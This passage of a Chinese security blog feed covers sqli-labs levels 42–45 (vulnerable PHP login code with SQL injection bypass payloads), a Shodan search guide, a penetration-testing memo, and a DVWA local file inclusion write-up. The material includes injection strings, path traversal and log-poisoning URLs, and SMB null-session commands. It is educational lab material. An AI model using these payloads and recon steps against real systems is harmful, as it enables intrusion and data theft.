width=&#39;45&#39;&gt;&lt;/br&gt;HOME&lt;/a&gt;&lt;/div&gt;&lt;?PHPsession_start();//including the Mysql connect parameters.include(&quot;../sql-connections/db-creds.inc&quot;);function sqllogin($host,$dbuser,$dbpass, $dbname){   // connectivity//mysql connections for stacked query examples.$con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname);   $username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);   $password = $_POST[&quot;login_password&quot;];   // Check connection   if (mysqli_connect_errno($con1))   {       echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error();   }   else   {       @mysqli_select_db($con1, $dbname) or die ( &quot;Unable to connect to the database ######: &quot;);   }   /* execute multi query */   $sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;   if (@mysqli_multi_query($con1, $sql))   {        /* store first result set */      if($result = @mysqli_store_result($con1))      {     if($row = @mysqli_fetch_row($result))     {        if ($row[1])        {           return $row[1];        }        else        {           return 0;        }     }      }      else       {    echo &#39;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#39;;    print_r(mysqli_error($con1));    echo &quot;&lt;/font&gt;&quot;;        }   }   else    {    echo &#39;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#39;;    print_r(mysqli_error($con1));    echo &quot;&lt;/font&gt;&quot;;      }}$login = sqllogin($host,$dbuser,$dbpass, $dbname);if (!$login== 0) {    $_SESSION[&quot;username&quot;] = $login;    setcookie(&quot;Auth&quot;, 1, time()+3600);  /* expire in 15 Minutes */    header(&#39;Location: logged-in.php&#39;);} else{?&gt;&lt;tr&gt;&lt;td colspan=&quot;2&quot; style=&quot;text-align:center;&quot;&gt;&lt;br/&gt;&lt;p style=&quot;color:#FF0000;&quot;&gt;&lt;center&gt;&lt;img src=&quot;../images/slap1.jpg&quot;&gt;&lt;/center&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;?php} ?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>要求万能密码登录</p><pre><code>payload:admin&#39;or&#39;1&#39;|&#39;1</code></pre><p><img src="https://s2.ax1x.com/2019/02/08/kNMCKP.png" alt="kNMCKP.png"></p><p><b>第四十三关</b></p><hr><p>代码如下：</p><pre><code class="php">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;div align=&quot;right&quot;&gt;&lt;a style=&quot;font-size:.8em;color:#FFFF00&quot; href=&#39;index.php&#39;&gt;&lt;img src=&quot;../images/Home.png&quot; height=&#39;45&#39;; width=&#39;45&#39;&gt;&lt;/br&gt;HOME&lt;/a&gt;&lt;/div&gt;&lt;?PHPsession_start();//including the Mysql connect parameters.include(&quot;../sql-connections/db-creds.inc&quot;);function sqllogin($host,$dbuser,$dbpass, $dbname){   // connectivity//mysql connections for stacked query examples.$con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname);   $username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);   $password = $_POST[&quot;login_password&quot;];   // Check connection   if (mysqli_connect_errno($con1))   {       echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error();   }   else   {       @mysqli_select_db($con1, $dbname) or die ( &quot;Unable to connect to the database ######: &quot;);   }   /* execute multi query */   $sql = &quot;SELECT * FROM users WHERE username=(&#39;$username&#39;) and password=(&#39;$password&#39;)&quot;;   if (@mysqli_multi_query($con1, $sql))   {        /* store first result set */      if($result = @mysqli_store_result($con1))      {     if($row = @mysqli_fetch_row($result))     {        if ($row[1])        {           return $row[1];        }        else        {           return 0;        }     }      }      else       {    echo &#39;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#39;;    print_r(mysqli_error($con1));    echo &quot;&lt;/font&gt;&quot;;        }   }   else    {    echo &#39;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#39;;    print_r(mysqli_error($con1));    echo &quot;&lt;/font&gt;&quot;;      }}$login = sqllogin($host,$dbuser,$dbpass, $dbname);if (!$login== 0) {    $_SESSION[&quot;username&quot;] = $login;    setcookie(&quot;Auth&quot;, 1, time()+3600);  /* expire in 15 Minutes */    header(&#39;Location: logged-in.php&#39;);} else{?&gt;&lt;tr&gt;&lt;td colspan=&quot;2&quot; style=&quot;text-align:center;&quot;&gt;&lt;br/&gt;&lt;p style=&quot;color:#FF0000;&quot;&gt;&lt;center&gt;&lt;img src=&quot;../images/slap1.jpg&quot;&gt;&lt;/center&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;?php} ?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>要求万能密码登录</p><pre><code>payload:admin&#39;)or(&#39;1&#39;)|(&#39;1</code></pre><p><img src="https://s2.ax1x.com/2019/02/08/kNMJPJ.md.png" alt="kNMJPJ.md.png"></p><p><b>第四十四关</b></p><hr><p>代码如下：</p><pre><code class="php">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;div align=&quot;right&quot;&gt;&lt;a style=&quot;font-size:.8em;color:#FFFF00&quot; href=&#39;index.php&#39;&gt;&lt;img src=&quot;../images/Home.png&quot; height=&#39;45&#39;; width=&#39;45&#39;&gt;&lt;/br&gt;HOME&lt;/a&gt;&lt;/div&gt;&lt;?phpsession_start();//including the Mysql connect parameters.include(&quot;../sql-connections/db-creds.inc&quot;);function sqllogin($host,$dbuser,$dbpass, $dbname){   // connectivity//mysql connections for stacked query examples.$con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname);   $username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);   $password = $_POST[&quot;login_password&quot;];   // Check connection   if (mysqli_connect_errno($con1))   {       echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error();   }   else   {       @mysqli_select_db($con1, $dbname) or die ( &quot;Unable to connect to the database ######: &quot;);   }   /* execute multi query */   $sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;   if (@mysqli_multi_query($con1, $sql))   {        /* store first result set */      if($result = @mysqli_store_result($con1))      {     if($row = @mysqli_fetch_row($result))     {        if ($row[1])        {           return $row[1];        }        else        {           return 0;        }     }      }    }}$login = sqllogin($host,$dbuser,$dbpass, $dbname);if (!$login== 0) {    $_SESSION[&quot;username&quot;] = $login;    setcookie(&quot;Auth&quot;, 1, time()+3600);  /* expire in 15 Minutes */    header(&#39;Location: logged-in.php&#39;);} else{?&gt;&lt;tr&gt;&lt;td colspan=&quot;2&quot; style=&quot;text-align:center;&quot;&gt;&lt;br/&gt;&lt;p style=&quot;color:#FF0000;&quot;&gt;&lt;center&gt;&lt;img src=&quot;../images/slap1.jpg&quot;&gt;&lt;/center&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;?php} ?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><pre><code>payload:admin&#39;or&#39;1&#39;|&#39;1</code></pre><p><img src="https://s2.ax1x.com/2019/02/08/kNMJPJ.md.png" alt="kNMJPJ.md.png"></p><p><b>第四十五关</b></p><hr><p>代码如下：</p><pre><code class="php">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;div align=&quot;right&quot;&gt;&lt;a style=&quot;font-size:.8em;color:#FFFF00&quot; href=&#39;index.php&#39;&gt;&lt;img src=&quot;../images/Home.png&quot; height=&#39;45&#39;; width=&#39;45&#39;&gt;&lt;/br&gt;HOME&lt;/a&gt;&lt;/div&gt;&lt;?PHPsession_start();//including the Mysql connect parameters.include(&quot;../sql-connections/db-creds.inc&quot;);function sqllogin($host,$dbuser,$dbpass, $dbname){   // connectivity//mysql connections for stacked query examples.$con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname);   $username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);   $password = $_POST[&quot;login_password&quot;];   // Check connection   if (mysqli_connect_errno($con1))   {       echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error();   }   else   {       @mysqli_select_db($con1, $dbname) or die ( &quot;Unable to connect to the database ######: &quot;);   }   /* execute multi query */   $sql = &quot;SELECT * FROM users WHERE username=(&#39;$username&#39;) and password=(&#39;$password&#39;)&quot;;   if (@mysqli_multi_query($con1, $sql))   {        /* store first result set */      if($result = @mysqli_store_result($con1))      {     if($row = @mysqli_fetch_row($result))     {        if ($row[1])        {           return $row[1];        }        else        {           return 0;        }     }      }    }}$login = sqllogin($host,$dbuser,$dbpass, $dbname);if (!$login== 0) {    $_SESSION[&quot;username&quot;] = $login;    setcookie(&quot;Auth&quot;, 1, time()+3600);  /* expire in 15 Minutes */    header(&#39;Location: logged-in.php&#39;);} else{?&gt;&lt;tr&gt;&lt;td colspan=&quot;2&quot; style=&quot;text-align:center;&quot;&gt;&lt;br/&gt;&lt;p style=&quot;color:#FF0000;&quot;&gt;&lt;center&gt;&lt;img src=&quot;../images/slap1.jpg&quot;&gt;&lt;/center&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;?php} ?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>和43关的代码一样….</p><pre><code>payload:admin&#39;)or(&#39;1&#39;)|(&#39;1</code></pre><p><img src="https://s2.ax1x.com/2019/02/08/kNMfqf.png" alt="kNMfqf.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Shodan summary</title>
      <link href="/posts/645c6642.html"/>
      <url>/posts/645c6642.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr><p>这篇文章是看了某前辈的文章所写的，感觉shodan还是很强<br>前辈的文章链接：<a href="http://b404.xyz/2018/02/08/Shodan-Manual/" target="_blank" rel="noopener">Shodan手册</a></p><h3 id="shodan总结"><a href="#shodan总结" class="headerlink" title="shodan总结"></a>shodan总结</h3><p><b>介绍</b></p><hr><blockquote><p>shodan是一个搜索互联网连接设备的搜索引擎，不同于谷歌，必应，百度这些搜索引擎。用户可以在shodan上使用shodan搜索语法找到连接互联网的摄像头、路由器、服务器等设备信息。在渗透测试中，是个很不错的神器<br>Shodan的搜索流程：<br><img src="http://b404.xyz/img/shodan/1517795894244.png" alt=""></p></blockquote><p><b>声明</b></p><hr><p>此文章的来源是：<a href="http://b404.xyz/2018/02/08/Shodan-Manual/#search%E5%91%BD%E4%BB%A4" target="_blank" rel="noopener">Shodan手册</a>，学习了前辈的知识并加以总结</p><p><b>正文</b></p><hr><blockquote><p>Banner shodan采集的基本数据单是banner，banner是描述设备所运行服务的标志性文本信息。对于web服务器来说，其将返回标题或是telnet登录界面。banner的内容因服务类型的不同而异。</p></blockquote><pre><code>Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Connection: keep-aliveContent-Type: text/html;charset=utf-8Date: Thu, 07 Feb 2019 15:18:05 GMTExpires: Thu, 19 Nov 1981 08:52:00 GMTKeep-Alive: timeout=60Pragma: no-cacheServer: nginxTransfer-Encoding: chunked</code></pre><blockquote><p>从上面的banner显示，该设备正运行着nginx web服务器软件</p></blockquote><p>下面是S7工控系统协议的一个banner，这个banner详细了很多。CPU的类型，序列号都列了出来</p><pre><code>Copyright: Original Siemens EquipmentPLC name: S7_TurbineModule type: CPU 313CUnknown (129): Boot Loader           A%Module: 6ES7 313-5BG04-0AB0  v.0.5Basic Firmware: v.3.3.11Module name: CPU 313CSerial number of module: S Q-F2U049162015Plant identification: Basic Hardware: 6ES7 313-5BG04-0AB0  v.0.5</code></pre><blockquote><p>shodan搜索的是互联网的banner，如果只搜索指定的IP那么信息出现将很多。如果是搜索特定服务，那么不会出现其他的结果</p></blockquote><p>shodan的分布式爬虫：<br>爬虫分布于世界各地，包括：</p><ul><li>美国（东海岸和西海岸）</li><li>中国</li><li>冰岛</li><li>法国</li><li>台湾</li><li>越南</li><li>罗马尼亚</li><li>捷克共和国</li></ul><p>shodan的基本算法是：</p><pre><code>生成一个随机的IPv4地址从Shodan能解析的端口列表中生成一个随机端口测试检测随机端口上的随机IPv4地址，并获取Banner继续步骤1</code></pre><p>漏洞测试：<br>比如https的心脏滴血漏洞，如果存在心脏滴血漏洞。在调用shodan的API所返回的banner里，有CVE-2014-0160,如果不存在则是!CVE-2014-0160</p><pre><code>{    &quot;opts&quot;: {        &quot;heartbleed&quot;: &quot;... 174.142.92.126:8443 - VULNERABLE\n&quot;,        &quot;vulns&quot;: [&quot;CVE-2014-0160&quot;]    }}</code></pre><p>搜索美国有心脏滴血的服务country:US vuln:CVE-2014-0160<br>莫得高级会员的我= =#</p><p>语法的使用：<br>搜索开放了445端口的中国服务器：country:CN port:445<br><img src="https://s2.ax1x.com/2019/02/08/ktX9oQ.md.png" alt="ktX9oQ.md.png"></p><p>注意：搜索语法要用“”，例如：country:”CN”<br>搜索中国所有联网的设备：city:”China”<br><img src="https://s2.ax1x.com/2019/02/08/ktXVyV.png" alt="ktXVyV.png"></p><p>搜索开放了端口135,445的：port:”135,445”<br><img src="https://s2.ax1x.com/2019/02/08/ktXuo4.md.png" alt="ktXuo4.md.png"></p><p>用·排除搜索结果:port:”135,445” -country:”CN”<br><img src="https://s2.ax1x.com/2019/02/08/ktXQY9.md.png" alt="ktXQY9.md.png"></p><p>有时候也需要过滤一些标题为空的:port:”80” -hash:0<br><img src="https://s2.ax1x.com/2019/02/08/ktX3S1.png" alt="ktX3S1.png"></p><blockquote><p>Shodan上的每个banner都有一个哈希值，对于空的banner，hash值就为0。若尝试搜索简短的、静态的banner，使用哈希过滤语法就比较便捷。</p></blockquote><p>shodan常用的过滤器：</p><table><thead><tr><th>过滤器名</th><th>描述</th><th>举例</th></tr></thead><tbody><tr><td>category</td><td>现有的分类：</td><td>ics, malware    category:”malware”</td></tr><tr><td>city</td><td>城市的名字</td><td>city:”San Diego”</td></tr><tr><td>country</td><td>国家简写</td><td>country:”ES” country:”CN”</td></tr><tr><td>net</td><td>CIDR格式的IP地址</td><td>net:190.30.40.0/24</td></tr><tr><td>hostname</td><td>主机名或域名</td><td>hostname:”google”</td></tr><tr><td>port</td><td>端口号</td><td>port:21</td></tr><tr><td>org</td><td>组织或公司</td><td>org:”google”</td></tr><tr><td>isp</td><td>ISP供应商</td><td>isp:”China Telecom”</td></tr><tr><td>product</td><td>软件、平台</td><td>product:”Apache httpd” product:”openssh”</td></tr><tr><td>os</td><td>操作系统</td><td>os:”Windows 7 or 8”</td></tr><tr><td>version</td><td>软件版本</td><td>version:”2.6.1”</td></tr><tr><td>geo</td><td>经纬度</td><td>geo:”46.9481,7.4474”</td></tr></tbody></table><p>下载<br>完成搜索后，还能 下载搜索结果，不过这都是有钱人才能下载的，需要积分才能下载<br><img src="https://s2.ax1x.com/2019/02/08/ktjyC9.png" alt="ktjyC9.png"></p><p>继续例子：<br>搜索开放了8080端口，服务是IIS，位于美国的服务器：port:”8080” product:”Microsoft-IIS” country:”US” version:”6.0”<br><img src="https://s2.ax1x.com/2019/02/08/ktjHgI.md.png" alt="ktjHgI.md.png"></p><p>搜索可能受到DOUBLEPULSAR攻击的机器：port:”445” “SMB Version:1” os:”Windows”<br><img src="https://s2.ax1x.com/2019/02/08/ktve54.png" alt="ktve54.png"></p><p>搜索所有apache服务的baidu：”apache hostname:”baidu.com”<br><img src="https://s2.ax1x.com/2019/02/08/ktv0Mt.png" alt="ktv0Mt.png"></p><p>通过hash来搜索：<br>ping一下baidu的IP<br><img src="https://s2.ax1x.com/2019/02/08/ktvsZ8.png" alt="ktvsZ8.png"></p><p>shodan搜索此IP查看原始数据<br><img src="https://s2.ax1x.com/2019/02/08/ktvydS.png" alt="ktvydS.png"></p><p>获取hash<br><img src="https://s2.ax1x.com/2019/02/08/ktv6Ig.png" alt="ktv6Ig.png"></p><p>通过hash搜索：http.favicon.hash:”    -1215187578”<br><img src="https://s2.ax1x.com/2019/02/08/ktv7oF.png" alt="ktv7oF.png"></p><p>data.1.http.favicon.data的值是base64,可以自行验证<br><img src="https://s2.ax1x.com/2019/02/08/ktxSeK.png" alt="ktxSeK.png"></p><p>通过未知的icon搜索目标<br>首先要计算icon的hash值，然后在查询<br>由于mmh3这个库在windows下要安装VS才能成功安装，这里我就不示范了<br><img src="https://s2.ax1x.com/2019/02/08/kNSRRH.md.png" alt="kNSRRH.md.png"></p><p>地图搜索：<br>地图shodan：<a href="https://maps.shodan.io" target="_blank" rel="noopener">Shodan Maps</a><br><img src="https://s2.ax1x.com/2019/02/08/kNSLWQ.md.png" alt="kNSLWQ.md.png"></p><p>Exploit漏洞利用shodan搜索：<a href="https://exploits.shodan.io" target="_blank" rel="noopener">Shodan Exploits</a><br><img src="https://s2.ax1x.com/2019/02/08/kNSxLq.png" alt="kNSxLq.png"></p><p>图片搜索shodan：<a href="https://images.shodan.io" target="_blank" rel="noopener">Shodan - Account Management</a><br>此处莫得截图，要钱才能访问。。。。</p><p>shodan搜索截图：has_screenshot:true country:”KR”<br><img src="https://s2.ax1x.com/2019/02/08/kNpiYF.png" alt="kNpiYF.png"></p><p>shodan共享搜索语法：<a href="https://www.shodan.io/explore" target="_blank" rel="noopener">Shodan - Explore the Internet</a><br><img src="https://s2.ax1x.com/2019/02/08/kNpQYD.png" alt="kNpQYD.png"></p><pre><code>这里能找到很多东西，游戏服务器也能找到</code></pre><p><img src="https://s2.ax1x.com/2019/02/08/kN9tgJ.md.png" alt="kN9tgJ.md.png"></p><p>常用的语法：<br><img src="https://s2.ax1x.com/2019/02/08/kNEUJ0.png" alt="kNEUJ0.png"></p><p><img src="https://s2.ax1x.com/2019/02/08/kNEDL4.png" alt="kNEDL4.png"></p><p><img src="https://s2.ax1x.com/2019/02/08/kNEyw9.png" alt="kNEyw9.png"></p><p><img src="https://s2.ax1x.com/2019/02/08/kNVV6U.png" alt="kNVV6U.png"></p><p><img src="https://s2.ax1x.com/2019/02/08/kNVZXF.png" alt="kNVZXF.png"></p><p><img src="https://s2.ax1x.com/2019/02/08/kNVmm4.png" alt="kNVmm4.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Penetration test memo, incomplete version</title>
      <link href="/posts/b2490e91.html"/>
      <url>/posts/b2490e91.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>总结还没写完，头有点疼。。。可能是昨天晚上喝酒的缘故<br><img src="https://5b0988e595225.cdn.sohucs.com/images/20181107/99216fba9eff4c12af6947df9c7b5de0.jpeg" alt=""></p><h2 id="渗透测试的备忘"><a href="#渗透测试的备忘" class="headerlink" title="渗透测试的备忘"></a>渗透测试的备忘</h2><p><b>信息收集</b><br>whois查询</p><pre><code>whois 域名例如：whois baidu.com在线查询：https://www.aizhan.com，http://whois.domaintools.com,https://whois.icann.org</code></pre><p>真实IP查询</p><pre><code>1.DNS查询获得  dig a 域名  例如：dig a baidu.com2.查询DNS历史记录获得或者在线查询 （并不准确）  http://whois.domaintools.com3.通过超级ping找出真实IP http://ping.chinaz.com/</code></pre><p>DNS查询</p><pre><code>dnsenum 域名 会自动检查DNS区域传输例如：dnsenum baidu.comdig a xxx.com 查询a记录dig mx xxx.com 查询mx记录dig axfr xxx.com DNS区传输域检查dnsrecon -r xxx.com在线DNS查询推荐的站点：https://dnsdumpster.com/</code></pre><p><img src="https://s2.ax1x.com/2019/02/06/kYylE4.md.png" alt="kYylE4.md.png"></p><p>DNS区域检查</p><pre><code>dnsenum xxx.comdig axfr xxx.comnslookup -&gt; set type=any -&gt; ls -d xxx.com</code></pre><p>邮箱查询</p><pre><code>google搜索：iintext:xxxx@qq.comreg007查询：https://reg007.com/推荐工具查询，此工具在google上搜索：https://github.com/killswitch-GUI/SimplyEmail社工库：http://site2.sjk.space/</code></pre><p>指纹查询</p><pre><code>nc -v 192.168.1.1 80云悉：http://www.yunsee.cn/whatweb http://xxx.com #获取web指纹</code></pre><p>子域名查询</p><pre><code>Lasy子域名挖掘机自己写的：https://github.com/422926799/Subdomain-blastingip138子域名查询：http://site.ip138.com/ip138.com/domain.htm子域名光速查询接口：http://sbd.ximcx.cn/?#</code></pre><p>端口扫描与CVE漏洞查找</p><pre><code>chrome shodan插件：https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap/relatedshodan查询：https://www.shodan.io/zoomeye查询：https://www.zoomeye.org/</code></pre><p>nmap端口扫描<br>|命令|描述|<br>|—–|—|<br>|nmap -v -sS -A -T4 IP|Nmap详细扫描，运行syn stealth，T4计时（在LAN上应该没问题），操作系统和服务版本信息，traceroute和针对服务的脚本<br>|nmap -v -sS -p 1-65535 -A -T4 IP|扫描TCP全端口，更全面，但时间也很久<br>|nmap -v -sU -sS -p 1-65535 -A -T4|扫描TCP全部端口和UDP全部端口，更全面，但时间也更久<br>|nmap -v -sU -sS -P 1-65535 -A –script=auth,vuln IP|扫描全端口并自动测试端口漏洞<br>|根据扫描出的端口使用对应的脚本进行测试|根据扫描出的端口使用对应的脚本进行测试</p><p>nmap UDP扫描</p><pre><code>nmap -sU &lt;target&gt;</code></pre><p>UDP扫描程序</p><pre><code>git clone https://github.com/portcullislabs/udp-proto-scanner.git</code></pre><p>扫描所有服务的IP地址</p><pre><code>./udp-protocol-scanner.pl -f ip.txt </code></pre><p>扫描特定的UDP服务</p><pre><code>udp-proto-scanner.pl -p ntp -f ips.txt</code></pre><p>其他主机发现（C段查询）</p><pre><code>netdiscover -r 192.168.3.0/24 从ARP发现子网上的IP （实在不靠谱）fping -ag 192.168.3.0/24 发现存活IP在线查询：http://www.webscan.cc/whatweb --no-errors IP/24</code></pre><p>旁站查询：</p><pre><code>http://www.webscan.cc/</code></pre><p>端口漏洞对应列表：<br>|序号|分类|端口|服务|漏洞<br>|—-|—-|——-|—–|—–<br>|1| 中间件 |6379 |Redis |未授权访问<br>|2 |中间件 |8161 |Apache Group ActiveMQ |远程代码执行<br>|3 |中间件 |873 |Rsync |远程代码执行<br>|4| 中间件 |9001 |Supervisor |远程命令执行漏洞。<br>|5| 中间件 |4899 |Radmin |密码爆破2）远程命令执行<br>|6 |中间件 |2181 |Zookeeper |未授权访问<br>|7 |中间件 |11211| memcached|未授权访问<br>|8 |中间件 |2375 |Docker |未授权访问<br>|9 |中间件 |7001/7002| weblogic |密码爆破2）Java反序列化漏洞3）任意文件泄漏<br>|10| 中间件| 8080 |Resin |目录遍历2）远程文件读取<br>|11 |中间件 |8080 |GlassFish|弱口令2）任意文件读取3）认证绕过<br>|12 |中间件 |9990 |jboss |密码爆破2）远程代码执行3）Java反序列化<br>|13 |中间件 |9043| Websphere|密码爆破2）任意文件泄露3）java反序列化<br>|14| 中间件| 80/81/443 |IIS |PUT写文件2）ms150343）http.sys内存下载4）解析漏洞5）短文件名泄漏<br>|15 |中间件 |80/8080 |Apache |解析漏洞2）目录遍历3）任意文件上传4）密码爆破<br>|16| 中间件| 80/8080| Tomcat|爆破，远程代码执行漏洞，绕过漏洞等一系列安全漏洞<br>|17 |中间件 |80/8080 |Nginx |整数溢出2）目录遍历下载3）文件类型解析漏洞<br>|18 |中间件 |8080/8089| Jenkins|口令爆破2）未授权访问3）反序列化<br>|19| 服务类 |161 |SNMP|未授权访问<br>|20 |服务类| 443 |HTTPS服务|SSL心脏滴血<br>|21 |服务类 |2049| NFS |未授权访问<br>|22 |服务类 |445|Samba-NetBIOS服务|MS17-010漏洞2）MS06-040漏洞3) 病毒入口<br>|23 |服务类| 135|RPC(远程过程调用)服务|利用RPC漏洞攻击计算机2）病毒入口<br>|24 |服务类| 139 |Samba-文件和打印共享|IPC$共享后的空链接漏洞2）病毒入口<br>|25 |服务类| 137 |Samba-NetBIOS 名字服务|利用RPC漏洞攻击计算机2）病毒入口3)暴力破解<br>|26 |服务类| 3389| Windows远程连接|Shift粘滞键后门2）密码爆破3)利用ms12-020攻击3389端口<br>|27 |服务类| 22 |SSH |密码爆破2)防火墙SSH后门3)OpenSSL漏洞<br>|28 |服务类| 23 |telnet |使用明文传输技术-嗅探2)暴力破解<br>|29 |服务类| 53 |DNS |远程溢出2)DNS欺骗攻击3)拒绝服务攻击4）DNS域传送信息泄露5）DNS劫持6）DNS缓存投毒7）DNS隧道技术刺穿防火墙<br>|30 |服务类| 389| LDAP|注入2）未授权访问3）弱密码<br>|31 |数据库| 1521| oracle|各种版本的漏洞2）密码爆破3）远程溢出<br>|32 |数据库| 1433 |SQLServer|各种版本的漏洞2）密码爆破3）远程溢出<br>|33 |数据库| 3306 |mysql|各种版本的漏洞2）密码爆破3）自定义函数<br>|34 |其他软件| 5631| symantecpcanywhere|各种版本的漏洞<br>|35 |其他软件| 5900/5900|VNC|密码验证绕过2）拒绝服务攻击3）权限提升4）密码爆破<br>|36 |其他软件| 8649| ganglia|未授权访问<br>|37 |其他软件| 5632 |Pcanywhere|提权控制服务：2）拒绝服务攻击：3）代码执行<br>|38 |其他软件| 21| FTP |远程溢出2）暴力破解3）匿名访问—未授权访问4）配置不当，直接 cd / &amp;&amp; dir5）使用明文传输技术-嗅探6）后门技术7）跳转攻击<br>|39 |其他软件 |81| ipcam|暴力破解2）可以基于NTP的反射和放大攻击3）NTP反射型doos攻击</p><p>扫描敏感目录：</p><pre><code>wwwscan御剑</code></pre><p><b>漏洞挖掘</b></p><pre><code>寻找对应的中间件漏洞nikto -h xxx.comAWVS扫描Burp配置好后自动化扫描APPSCAN扫描暴力破解表单尝试万能密码绕过登录测试错误的配置服务寻找对应的CMS漏洞尝试逻辑漏洞挖掘：如短信轰炸，0元购买越权漏洞有框就测试注入和xss有表单就爆破有短信发送的就尝试有没有短信轰炸的url有id的就测试注入有狗能绕则绕，不能绕就扔掉抓包如果有类似json数据的多注意一下修改一下值看看有什么变化</code></pre><p><b>枚举网络攻击服务</b><br>samba枚举<br>smb枚举工具</p><pre><code>nmblookup -A targetsmbclient //MOUNT/share -I target -Nrpcclient -U &quot;&quot; targetenum4linux target</code></pre><p>指纹smb版</p><pre><code>smbclient -L //ip</code></pre><p>查找开放的SMB</p><pre><code>nmap -v -T4 -oA shares --script smb-enum-shares --script-args smbuser=&lt;username&gt;,smbpass=&lt;password&gt; -p 445 IP/24</code></pre><p>枚举SMB用户</p><pre><code>nmap -sU -sS --script=smb-enum-users -p U:137,T:139 x.x.x.2-254</code></pre><p>RID枚举域用户（Windows server 2003起作用）</p><pre><code>ridenum IP 500 50000 dict.txt</code></pre><p>用于RID枚举的metasploit模块</p><pre><code>use auxiliary/scanner/smb/smb_lookupsid</code></pre><p>空会话测试</p><pre><code>windows:net use \\&lt;TARGET&gt;\IPC$ &quot;&quot; /u:&quot;&quot;Linux:smbclient -L //IP</code></pre><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Local file contains a summary of the vulnerability</title>
      <link href="/posts/f915f25f.html"/>
      <url>/posts/f915f25f.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前整理的忘记发博客了，现在补上<br><img src="http://5b0988e595225.cdn.sohucs.com/images/20181128/8f6aa11d22fe4ab09ce48bf8ada2406f.jpeg" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h4 id="本地文件包含总结"><a href="#本地文件包含总结" class="headerlink" title="本地文件包含总结"></a>本地文件包含总结</h4><p><b>漏洞概述</b><br>文件包含是PHP的一个功能，可以包含php文件并运行，或者调用被包含的PHP文件里面的函数。但是由于未对用户可控变量进行输入检查，导致用户可以控制被包含的文件，成功利用时可以使web server将特定文件当做php执行，从而导致用户可以获取一定的服务器权限。</p><p><b>漏洞代码如下</b></p><pre><code class="php">&lt;?php // The page we wish to display $file = $_GET[ &#39;page&#39; ]; ?&gt; </code></pre><p><b>攻击手法如下</b><br>知道绝对路径下可以直接：</p><pre><code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=I:/phpstudy/PHPTutorial/WWW/dd.txt</code></pre><p><img src="https://s2.ax1x.com/2019/02/03/kGTTmR.png" alt="kGTTmR.png"></p><p>不知道绝对路径下你可以这样</p><pre><code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=/../../../../../phpstudy/PHPTutorial/WWW/dd.txt</code></pre><p>用/../../../../../为相对路径获取<br><img src="https://s2.ax1x.com/2019/02/03/kGTjpD.md.png" alt="kGTjpD.md.png"></p><p>log文件getshell：<br>利用条件：先看看一些指定的日志文件有没有权限读取，如果有的话就可以getshell了 </p><pre><code>1.通过扫描出的端口判断有哪些log2.通过web容器得到对应的log文件</code></pre><p>有权限读取Apache的log文件或错误log文件，就是error.log我这里用的是error.log<br><img src="https://s2.ax1x.com/2019/02/03/kG7E9S.md.png" alt="kG7E9S.md.png"></p><p>在url框写入的内容会被记录到log,那么直接写一句话即可，这里写phpinfo测试</p><pre><code>http://127.0.0.1/&lt;?php phpinfo();?&gt; 会被记到log文件，然后通过文件包含log文件即可执行</code></pre><p><img src="https://s2.ax1x.com/2019/02/03/kG7Nu9.md.png" alt="kG7Nu9.md.png"></p><p>常见的log文件有</p><pre><code>apache的log apache.log error.log系统运行的log ftp.log 